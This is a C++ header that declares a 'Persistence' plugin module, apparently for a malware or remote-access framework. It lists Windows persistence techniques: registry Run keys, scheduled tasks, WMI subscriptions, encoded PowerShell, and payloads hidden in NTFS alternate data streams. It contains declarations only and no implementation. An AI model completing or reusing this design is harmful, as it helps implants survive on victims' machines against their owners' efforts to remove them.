#pragma once
#include "Module.h"
#include <thread>

class PersistenceModule : public Module {
public:
    std::string name() const override { return "Persistence"; }
    void init() override;
private:
    std::thread monitor_;
    void ensure_persistence();
    void setup_wmi_subscription();
#ifdef _WIN32
    std::string executable_path() const;
    void set_run_key_hkcu(const std::string& cmd);
    void set_run_key_hklm(const std::string& cmd);
    bool check_run_key_hkcu() const;
    bool check_run_key_hklm() const;
    void set_task(const std::string& cmd);
    bool check_task() const;
    std::string encode_ps(const std::string& path) const;
    std::string ads_path() const;
    bool ads_exists() const;
    void write_ads_payload(const std::string& path);
#endif
};

extern "C" Module* create_module();

void remove_persistence();
